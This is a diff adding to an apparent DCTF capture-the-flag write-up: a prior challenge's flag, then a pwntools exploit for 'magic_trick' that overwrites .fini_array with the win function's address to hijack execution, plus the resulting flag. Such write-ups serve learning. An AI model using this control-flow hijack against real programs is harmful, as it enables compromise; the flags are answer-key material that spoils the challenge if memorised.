@@ -75,3 +75,22 @@ rev: stdin: Invalid or incomplete multibyte or wide character
 By guessing the last letters as `0k5`.
 
 FLAG : ***```dctf{n0w_g0_r3ad_s0me_b00k5}```***
+
+# ***MAGIC_TRICK***
+
+```py
+from pwn import *
+
+binary = context.binary = ELF('./magic_trick')
+
+if args.REMOTE:
+    p = remote('dctf-chall-magic-trick.westeurope.azurecontainer.io', 7481)
+else:
+    p = process(binary.path)
+
+p.sendlineafter('write\n', str(binary.sym.win))
+p.sendlineafter('it\n', str(binary.get_section_by_name('.fini_array').header.sh_addr))
+print(p.recvuntil('}').decode())
+```
+
+FLAG : ***```dctf{1_L1k3_M4G1c}```***
